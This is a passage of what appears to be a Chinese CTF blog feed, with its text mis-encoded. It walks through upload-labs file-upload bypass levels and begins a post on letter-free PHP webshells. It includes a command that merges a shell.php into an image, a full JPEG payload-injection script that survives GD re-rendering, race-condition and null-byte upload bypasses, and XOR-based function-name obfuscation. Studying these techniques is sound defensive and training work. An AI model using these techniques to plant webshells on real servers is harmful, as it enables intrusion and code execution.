class="line">        return $fileType;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±æºç å¯çŸ¥ï¼Œæ˜¯é€šè¿‡æ£€æµ‹æ–‡ä»¶å¤´(ä¸¤ä¸ªå­—èŠ‚)æ¥åˆ¤æ–­æ–‡ä»¶ç±»å‹çš„</p><p>é€šè¿‡è¯»æ–‡ä»¶çš„å‰2ä¸ªå­—èŠ‚åˆ¤æ–­æ–‡ä»¶ç±»å‹ï¼Œå› æ­¤ç›´æ¥ä¸Šä¼ å›¾ç‰‡é©¬å³å¯ï¼Œåˆ¶ä½œæ–¹æ³•ï¼šcmdä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy normal.jpg &#x2F;b + shell.php &#x2F;a webshell.jpg</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œä½¿ç”¨æ–‡ä»¶åŒ…å«åŒ…å«ä¸Šä¼ çš„å›¾ç‰‡é©¬</p><p>æˆ–è€…åœ¨webshellå‰é¢ä¸€è¡ŒåŠ ä¸ŠGIF89a,å¹¶å‘½åä¸º.gifåç¼€æ–‡ä»¶ï¼Œå³å¯ç”Ÿæˆgifç±»å‹çš„å›¾ç‰‡é©¬</p><h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><p><strong>è€ƒå¯Ÿç‚¹ï¼š</strong>å›¾ç‰‡é©¬</p><p><strong>é€šå…³æ–¹æ³•ï¼š</strong></p><p>æºç <code>getimagesize()</code>å‡½æ•°è·å–æ–‡ä»¶ç±»å‹ï¼Œè¿˜æ˜¯ç›´æ¥å°±å¯ä»¥åˆ©ç”¨å›¾ç‰‡é©¬å°±å¯è¿›è¡Œç»•è¿‡</p><p><code>getimagesize()</code>å‡½æ•°æ˜¯é€šè¿‡è¯†åˆ«æ–‡ä»¶å¤´æ¥åˆ¤åˆ«æ˜¯å¦æ˜¯å›¾ç‰‡æ–‡ä»¶çš„</p><h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><p><strong>è€ƒå¯Ÿç‚¹ï¼š</strong>å›¾ç‰‡é©¬</p><p><strong>é€šå…³æ–¹æ³•ï¼š</strong></p><p>è¿™é‡Œç”¨åˆ°php_exifæ¨¡å—æ¥åˆ¤æ–­æ–‡ä»¶ç±»å‹ï¼Œè¿˜æ˜¯ç›´æ¥å°±å¯ä»¥åˆ©ç”¨å›¾ç‰‡é©¬å°±å¯è¿›è¡Œç»•è¿‡</p><h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><p><strong>è€ƒå¯Ÿç‚¹ï¼š</strong>å›¾ç‰‡é©¬+content-type+äºŒæ¬¡æ¸²æŸ“</p><p><strong>é€šå…³æ–¹æ³•ï¼š</strong></p><p>æœ¬å…³ç»¼åˆåˆ¤æ–­äº†åç¼€åã€content-typeï¼Œä»¥åŠåˆ©ç”¨imagecreatefromgifåˆ¤æ–­æ˜¯å¦ä¸ºgifå›¾ç‰‡ï¼Œæœ€åå†åšäº†ä¸€æ¬¡äºŒæ¬¡æ¸²æŸ“</p><p>ä»€ä¹ˆæ˜¯äºŒæ¬¡æ¸²æŸ“å‘¢ï¼ŸäºŒæ¬¡æ¸²æŸ“å°±æ˜¯è°ƒç”¨APIï¼Œä¾‹å¦‚phpçš„GDåº“ï¼Œé‡æ–°ç”Ÿæˆä¸€å¼ å›¾ç‰‡ï¼Œåœ¨ç”Ÿæˆçš„è¿‡ç¨‹ä¸­ï¼ŒæŠŠåŸæœ¬å±äºå›¾åƒæ•°æ®çš„éƒ¨åˆ†æŠ“äº†å‡ºæ¥ï¼Œå†ç”¨è‡ªå·±çš„API æˆ–å‡½æ•°è¿›è¡Œé‡æ–°æ¸²æŸ“</p><p>å¯¹æ¸²æŸ“/åŠ è½½æµ‹è¯•çš„æ”»å‡»æ–¹å¼æ˜¯ä»£ç æ³¨å…¥ç»•è¿‡</p><p>å¯¹äºŒæ¬¡æ¸²æŸ“æ”»å‡»æ–¹å¼æ˜¯æ”»å‡»æ–‡ä»¶åŠ è½½å™¨è‡ªèº«</p><p>å…³äºç»•è¿‡äºŒæ¬¡æ¸²æŸ“,æˆ‘ä»¬åªéœ€è¦æ‰¾åˆ°æ¸²æŸ“å‰åæ²¡æœ‰å˜åŒ–çš„ä½ç½®,ç„¶åå°†phpä»£ç å†™è¿›å»,å°±å¯ä»¥æˆåŠŸä¸Šä¼ å¸¦æœ‰phpä»£ç çš„å›¾ç‰‡äº†</p><p>å°†ä¸Šä¼ çš„å›¾ç‰‡ä¸‹è½½åˆ°æœ¬åœ°ï¼Œä½¿ç”¨16è¿›åˆ¶ç¼–è¾‘å™¨å°†å…¶æ‰“å¼€ï¼Œå‘ç°å…¶å†…å®¹å·²ç»æ”¹å˜</p><h3 id="ä¸Šä¼ gif"><a href="#ä¸Šä¼ gif" class="headerlink" title="ä¸Šä¼ gif"></a>ä¸Šä¼ gif</h3><h3 id="ä¸Šä¼ png"><a href="#ä¸Šä¼ png" class="headerlink" title="ä¸Šä¼ png"></a>ä¸Šä¼ png</h3><h3 id="ä¸Šä¼ jpg"><a href="#ä¸Šä¼ jpg" class="headerlink" title="ä¸Šä¼ jpg"></a>ä¸Šä¼ jpg</h3><p>è¿™é‡Œä¹Ÿé‡‡ç”¨å›½å¤–å¤§ç‰›ç¼–å†™çš„è„šæœ¬jpg_payload.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;*</span><br><span class="line"></span><br><span class="line">The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span><br><span class="line">It is necessary that the size and quality of the initial image are the same as those of the processed image.</span><br><span class="line"></span><br><span class="line">1) Upload an arbitrary image via secured files upload script</span><br><span class="line">2) Save the processed image and launch:</span><br><span class="line">jpg_payload.php &lt;jpg_name.jpg&gt;</span><br><span class="line"></span><br><span class="line">In case of successful injection you will get a specially crafted image, which should be uploaded again.</span><br><span class="line"></span><br><span class="line">Since the most straightforward injection method is used, the following problems can occur:</span><br><span class="line">1) After the second processing the injected data may become partially corrupted.</span><br><span class="line">2) The jpg_payload.php script outputs &quot;Something&#39;s wrong&quot;.</span><br><span class="line">If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span><br><span class="line"></span><br><span class="line">Sergey Bobrov @Black2Fan.</span><br><span class="line"></span><br><span class="line">See also:</span><br><span class="line">https:&#x2F;&#x2F;www.idontplaydarts.com&#x2F;2012&#x2F;06&#x2F;encoding-web-shells-in-png-idat-chunks&#x2F;</span><br><span class="line"></span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line">$miniPayload &#x3D; &quot;&lt;?&#x3D;phpinfo();?&gt;&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(!extension_loaded(&#39;gd&#39;) || !function_exists(&#39;imagecreatefromjpeg&#39;)) &#123;</span><br><span class="line">    die(&#39;php-gd is not installed&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!isset($argv[1])) &#123;</span><br><span class="line">    die(&#39;php jpg_payload.php &lt;jpg_name.jpg&gt;&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">set_error_handler(&quot;custom_error_handler&quot;);</span><br><span class="line"></span><br><span class="line">for($pad &#x3D; 0; $pad &lt; 1024; $pad++) &#123;</span><br><span class="line">    $nullbytePayloadSize &#x3D; $pad;</span><br><span class="line">    $dis &#x3D; new DataInputStream($argv[1]);</span><br><span class="line">    $outStream &#x3D; file_get_contents($argv[1]);</span><br><span class="line">    $extraBytes &#x3D; 0;</span><br><span class="line">    $correctImage &#x3D; TRUE;</span><br><span class="line"></span><br><span class="line">    if($dis-&gt;readShort() !&#x3D; 0xFFD8) &#123;</span><br><span class="line">        die(&#39;Incorrect SOI marker&#39;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() &#x3D;&#x3D; 0xFF)) &#123;</span><br><span class="line">        $marker &#x3D; $dis-&gt;readByte();</span><br><span class="line">        $size &#x3D; $dis-&gt;readShort() - 2;</span><br><span class="line">        $dis-&gt;skip($size);</span><br><span class="line">        if($marker &#x3D;&#x3D;&#x3D; 0xDA) &#123;</span><br><span class="line">            $startPos &#x3D; $dis-&gt;seek();</span><br><span class="line">            $outStreamTmp &#x3D; </span><br><span class="line">                substr($outStream, 0, $startPos) . </span><br><span class="line">                $miniPayload . </span><br><span class="line">                str_repeat(&quot;\0&quot;,$nullbytePayloadSize) . </span><br><span class="line">                substr($outStream, $startPos);</span><br><span class="line">            checkImage(&#39;_&#39;.$argv[1], $outStreamTmp, TRUE);</span><br><span class="line">            if($extraBytes !&#x3D;&#x3D; 0) &#123;</span><br><span class="line">                while((!$dis-&gt;eof())) &#123;</span><br><span class="line">                    if($dis-&gt;readByte() &#x3D;&#x3D;&#x3D; 0xFF) &#123;</span><br><span class="line">                        if($dis-&gt;readByte !&#x3D;&#x3D; 0x00) &#123;</span><br><span class="line">                            break;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                $stopPos &#x3D; $dis-&gt;seek() - 2;</span><br><span class="line">                $imageStreamSize &#x3D; $stopPos - $startPos;</span><br><span class="line">                $outStream &#x3D; </span><br><span class="line">                    substr($outStream, 0, $startPos) . </span><br><span class="line">                    $miniPayload . </span><br><span class="line">                    substr(</span><br><span class="line">                        str_repeat(&quot;\0&quot;,$nullbytePayloadSize).</span><br><span class="line">                            substr($outStream, $startPos, $imageStreamSize),</span><br><span class="line">                        0,</span><br><span class="line">                        $nullbytePayloadSize+$imageStreamSize-$extraBytes) . </span><br><span class="line">                            substr($outStream, $stopPos);</span><br><span class="line">            &#125; elseif($correctImage) &#123;</span><br><span class="line">                $outStream &#x3D; $outStreamTmp;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            if(checkImage(&#39;payload_&#39;.$argv[1], $outStream)) &#123;</span><br><span class="line">                die(&#39;Success!&#39;);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">unlink(&#39;payload_&#39;.$argv[1]);</span><br><span class="line">die(&#39;Something\&#39;s wrong&#39;);</span><br><span class="line"></span><br><span class="line">function checkImage($filename, $data, $unlink &#x3D; FALSE) &#123;</span><br><span class="line">    global $correctImage;</span><br><span class="line">    file_put_contents($filename, $data);</span><br><span class="line">    $correctImage &#x3D; TRUE;</span><br><span class="line">    imagecreatefromjpeg($filename);</span><br><span class="line">    if($unlink)</span><br><span class="line">        unlink($filename);</span><br><span class="line">    return $correctImage;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function custom_error_handler($errno, $errstr, $errfile, $errline) &#123;</span><br><span class="line">    global $extraBytes, $correctImage;</span><br><span class="line">    $correctImage &#x3D; FALSE;</span><br><span class="line">    if(preg_match(&#39;&#x2F;(\d+) extraneous bytes before marker&#x2F;&#39;, $errstr, $m)) &#123;</span><br><span class="line">        if(isset($m[1])) &#123;</span><br><span class="line">            $extraBytes &#x3D; (int)$m[1];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class DataInputStream &#123;</span><br><span class="line">    private $binData;</span><br><span class="line">    private $order;</span><br><span class="line">    private $size;</span><br><span class="line"></span><br><span class="line">    public function __construct($filename, $order &#x3D; false, $fromString &#x3D; false) &#123;</span><br><span class="line">        $this-&gt;binData &#x3D; &#39;&#39;;</span><br><span class="line">        $this-&gt;order &#x3D; $order;</span><br><span class="line">        if(!$fromString) &#123;</span><br><span class="line">            if(!file_exists($filename) || !is_file($filename))</span><br><span class="line">                die(&#39;File not exists [&#39;.$filename.&#39;]&#39;);</span><br><span class="line">            $this-&gt;binData &#x3D; file_get_contents($filename);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;binData &#x3D; $filename;</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;size &#x3D; strlen($this-&gt;binData);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function seek() &#123;</span><br><span class="line">        return ($this-&gt;size - strlen($this-&gt;binData));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function skip($skip) &#123;</span><br><span class="line">        $this-&gt;binData &#x3D; substr($this-&gt;binData, $skip);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function readByte() &#123;</span><br><span class="line">        if($this-&gt;eof()) &#123;</span><br><span class="line">            die(&#39;End Of File&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">        $byte &#x3D; substr($this-&gt;binData, 0, 1);</span><br><span class="line">        $this-&gt;binData &#x3D; substr($this-&gt;binData, 1);</span><br><span class="line">        return ord($byte);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function readShort() &#123;</span><br><span class="line">        if(strlen($this-&gt;binData) &lt; 2) &#123;</span><br><span class="line">            die(&#39;End Of File&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">        $short &#x3D; substr($this-&gt;binData, 0, 2);</span><br><span class="line">        $this-&gt;binData &#x3D; substr($this-&gt;binData, 2);</span><br><span class="line">        if($this-&gt;order) &#123;</span><br><span class="line">            $short &#x3D; (ord($short[1]) &lt;&lt; 8) + ord($short[0]);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $short &#x3D; (ord($short[0]) &lt;&lt; 8) + ord($short[1]);</span><br><span class="line">        &#125;</span><br><span class="line">        return $short;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function eof() &#123;</span><br><span class="line">        return !$this-&gt;binData||(strlen($this-&gt;binData) &#x3D;&#x3D;&#x3D; 0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>ä½¿ç”¨æ–¹æ³•ï¼š</strong></p><p>éšä¾¿æ‰¾ä¸€ä¸ªjpgå›¾ç‰‡,å…ˆä¸Šä¼ è‡³æœåŠ¡å™¨ç„¶åå†ä¸‹è½½åˆ°æœ¬åœ°ä¿å­˜ä¸º1.jpgï¼Œ</p><p>ä½¿ç”¨è„šæœ¬å¤„ç†1.jpg,å‘½ä»¤php jpg_payload.php 1.jpg</p><p>éœ€è¦æ³¨æ„çš„æ˜¯,æœ‰ä¸€äº›jpgå›¾ç‰‡ä¸èƒ½è¢«å¤„ç†,æ‰€ä»¥è¦å¤šå°è¯•ä¸€äº›jpgå›¾ç‰‡</p><h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><p><strong>è€ƒå¯Ÿç‚¹ï¼š</strong>ç«äº‰ä¸Šä¼ </p><p><strong>é€šå…³æ–¹æ³•ï¼š</strong></p><p>è¿™é‡Œå…ˆå°†æ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œç„¶åé€šè¿‡renameä¿®æ”¹åç§°ï¼Œå†é€šè¿‡unlinkåˆ é™¤æ–‡ä»¶ï¼Œå› æ­¤å¯ä»¥é€šè¿‡æ¡ä»¶ç«äº‰çš„æ–¹å¼åœ¨unlinkä¹‹å‰ï¼Œè®¿é—®webshellã€‚<br>é¦–å…ˆåœ¨burpä¸­ä¸æ–­å‘é€ä¸Šä¼ webshellçš„æ•°æ®åŒ…ï¼š</p><p>ç„¶åä¸æ–­åœ¨æµè§ˆå™¨ä¸­è®¿é—®ï¼Œå‘ç°é€šè¿‡ç«äº‰å¯ä»¥è®¿é—®åˆ°ï¼š</p><h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><p>è€ƒå¯Ÿç‚¹ï¼šç«äº‰ä¸Šä¼ +ç™½åå•</p><p><strong>é€šå…³æ–¹æ³•ï¼š</strong></p><p>æœ¬å…³å¯¹æ–‡ä»¶åç¼€ååšäº†ç™½åå•åˆ¤æ–­ï¼Œç„¶åä¼šä¸€æ­¥ä¸€æ­¥æ£€æŸ¥æ–‡ä»¶å¤§å°ã€æ–‡ä»¶æ˜¯å¦å­˜åœ¨ç­‰ç­‰ï¼Œå°†æ–‡ä»¶ä¸Šä¼ åï¼Œå¯¹æ–‡ä»¶é‡æ–°å‘½åï¼ŒåŒæ ·å­˜åœ¨æ¡ä»¶ç«äº‰çš„æ¼æ´ã€‚å¯ä»¥ä¸æ–­åˆ©ç”¨burpå‘é€ä¸Šä¼ å›¾ç‰‡é©¬çš„æ•°æ®åŒ…ï¼Œç”±äºæ¡ä»¶ç«äº‰ï¼Œç¨‹åºä¼šå‡ºç°æ¥ä¸åŠrenameçš„é—®é¢˜ï¼Œä»è€Œä¸Šä¼ æˆåŠŸï¼š</p><h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h2><p><strong>è€ƒå¯Ÿç‚¹ï¼š</strong>00æˆªæ–­</p><p><strong>é€šå…³æ–¹æ³•ï¼š</strong></p><p>æœ¬å…³è€ƒå¯ŸCVE-2015-2348 move_uploaded_file() 00æˆªæ–­ï¼Œä¸Šä¼ webshellï¼ŒåŒæ—¶è‡ªå®šä¹‰ä¿å­˜åç§°ï¼Œç›´æ¥ä¿å­˜ä¸ºphpæ˜¯ä¸è¡Œçš„</p><p>æŸ¥çœ‹ä»£ç ï¼Œå‘ç°move_uploaded_file()å‡½æ•°ä¸­çš„img_pathæ˜¯ç”±postå‚æ•°save_nameæ§åˆ¶çš„ï¼Œå› æ­¤å¯ä»¥åœ¨save_nameåˆ©ç”¨00æˆªæ–­ç»•è¿‡ï¼š</p><h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><p><strong>è€ƒå¯Ÿç‚¹ï¼š</strong></p><p><strong>é€šå…³æ–¹æ³•ï¼š</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
            <tag> æ–‡ä»¶ä¸Šä¼  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ— å­—æ¯æ•°å­—webshell</title>
      <link href="2019/10/16/nowords-webshell/"/>
      <url>2019/10/16/nowords-webshell/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä»‹ç»äº†æ„é€ æ— å­—æ¯æ•°å­—webshellçš„ä¸€äº›æ–¹æ³•ï¼</p><a id="more"></a><h2 id="ä¸€é“æœ‰æ„æ€çš„é¢˜"><a href="#ä¸€é“æœ‰æ„æ€çš„é¢˜" class="headerlink" title="ä¸€é“æœ‰æ„æ€çš„é¢˜"></a>ä¸€é“æœ‰æ„æ€çš„é¢˜</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line">if(isset($_GET[&#39;code&#39;]))&#123;</span><br><span class="line">    $code &#x3D; $_GET[&#39;code&#39;];</span><br><span class="line">    if(strlen($code)&gt;40)&#123;</span><br><span class="line">        die(&quot;Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code))&#123;</span><br><span class="line">        die(&quot;NO.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @eval($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;$hint &#x3D;  &quot;php function getFlag() to get flag&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>åˆ†æä»£ç å¯çŸ¥åªè¦æ‰§è¡ŒgetFlag()å‡½æ•°åº”è¯¥å°±å¯ä»¥å¾—åˆ°flagäº†</p><p>ä½†å¯¹codeçš„é•¿åº¦é™åˆ¶&lt;40,å¹¶ä¸”codeä¸èƒ½æœ‰æ•°å­—å’Œå¤§å°å†™å­—æ¯</p><h3 id="æ–¹å¼1-å¼‚æˆ–è¿ç®—"><a href="#æ–¹å¼1-å¼‚æˆ–è¿ç®—" class="headerlink" title="æ–¹å¼1(å¼‚æˆ–è¿ç®—)"></a>æ–¹å¼1(å¼‚æˆ–è¿ç®—)</h3><p>å…ˆè§£é‡Šä¸‹å¼‚æˆ–è¿ç®—</p><p>åœ¨PHPä¸­ï¼Œä¸¤ä¸ªå˜é‡è¿›è¡Œå¼‚æˆ–æ—¶ï¼Œå…ˆä¼šå°†å­—ç¬¦ä¸²è½¬æ¢æˆASCIIå€¼ï¼Œå†å°†ASCIIå€¼è½¬æ¢æˆäºŒè¿›åˆ¶å†è¿›è¡Œå¼‚æˆ–ï¼Œå¼‚æˆ–å®Œï¼Œåˆå°†ç»“æœä»äºŒè¿›åˆ¶è½¬æ¢æˆäº†ASCIIå€¼ï¼Œå†å°†ASCIIå€¼è½¬æ¢æˆå­—ç¬¦ä¸²ã€‚å¼‚æˆ–æ“ä½œæœ‰æ—¶ä¹Ÿè¢«ç”¨æ¥äº¤æ¢ä¸¤ä¸ªå˜é‡çš„å€¼ã€‚</p><p><strong>ä¸¾ä¸ªä¾‹å­ï¼š</strong></p><pre><code>Açš„ASCIIå€¼æ˜¯65ï¼Œå¯¹åº”çš„äºŒè¿›åˆ¶å€¼æ˜¯01000001?çš„ASCIIå€¼æ˜¯63ï¼Œå¯¹åº”çš„äºŒè¿›åˆ¶å€¼æ˜¯00111111</code></pre><p>å¼‚æˆ–çš„äºŒè¿›åˆ¶çš„å€¼æ˜¯01111110ï¼Œå¯¹åº”çš„ASCIIå€¼æ˜¯126ï¼Œå¯¹åº”çš„å­—ç¬¦ä¸²çš„å€¼å°±æ˜¯~äº†</p><p>æˆ‘ä»¬éƒ½çŸ¥é“ï¼ŒPHPæ˜¯å¼±ç±»å‹çš„è¯­è¨€ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨PHPä¸­æˆ‘ä»¬å¯ä»¥ä¸é¢„å…ˆå£°æ˜å˜é‡çš„ç±»å‹ï¼Œè€Œç›´æ¥å£°æ˜ä¸€ä¸ªå˜é‡å¹¶è¿›è¡Œåˆå§‹åŒ–æˆ–èµ‹å€¼æ“ä½œã€‚æ­£æ˜¯ç”±äºPHPå¼±ç±»å‹çš„è¿™ä¸ªç‰¹ç‚¹ï¼Œæˆ‘ä»¬å¯¹PHPçš„å˜ç±»å‹è¿›è¡Œéšå¼çš„è½¬æ¢ï¼Œå¹¶åˆ©ç”¨è¿™ä¸ªç‰¹ç‚¹è¿›è¡Œä¸€äº›éå¸¸è§„çš„æ“ä½œã€‚å¦‚å°†æ•´å‹è½¬æ¢æˆå­—ç¬¦ä¸²å‹ï¼Œå°†å¸ƒå°”å‹å½“ä½œæ•´å‹ï¼Œæˆ–è€…å°†å­—ç¬¦ä¸²å½“ä½œå‡½æ•°æ¥å¤„ç†ï¼Œä¸‹é¢æˆ‘ä»¬æ¥çœ‹ä¸€æ®µä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    function B()&#123;</span><br><span class="line">        echo &quot;Hello Angel_Kitty&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $_++;</span><br><span class="line">    $__&#x3D; &quot;?&quot; ^ &quot;&#125;&quot;;</span><br><span class="line">    $__();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¸€èµ·æ¥åˆ†æä¸€ä¸‹ä¸Šé¢è¿™æ®µä»£ç ï¼š</p><pre><code>$_++;è¿™è¡Œä»£ç çš„æ„æ€æ˜¯å¯¹å˜é‡åä¸º&quot;_&quot;çš„å˜é‡è¿›è¡Œè‡ªå¢æ“ä½œï¼Œåœ¨PHPä¸­æœªå®šä¹‰çš„å˜é‡é»˜è®¤å€¼ä¸ºnull,null==false==0,æˆ‘ä»¬å¯ä»¥åœ¨ä¸ä½¿ç”¨ä»»ä½•æ•°å­—çš„æƒ…å†µä¸‹,é€šè¿‡å¯¹æœªå®šä¹‰å˜é‡çš„è‡ªå¢æ“ä½œæ¥å¾—åˆ°ä¸€ä¸ªæ•°å­—ã€‚$__=&quot;?&quot; ^ &quot;&#125;&quot;;å¯¹å­—ç¬¦â€?â€å’Œâ€&#125;â€è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œå¾—åˆ°ç»“æœBèµ‹ç»™å˜é‡åä¸ºâ€__â€(ä¸¤ä¸ªä¸‹åˆ’çº¿)çš„å˜é‡$ __ ();é€šè¿‡ä¸Šé¢çš„èµ‹å€¼æ“ä½œï¼Œå˜é‡$__çš„å€¼ä¸ºBï¼Œæ‰€ä»¥è¿™è¡Œå¯ä»¥çœ‹ä½œæ˜¯B(),åœ¨PHPä¸­,è¿™è¡Œä»£ç è¡¨ç¤ºè°ƒç”¨å‡½æ•°B,æ‰€ä»¥æ‰§è¡Œç»“æœä¸ºHello 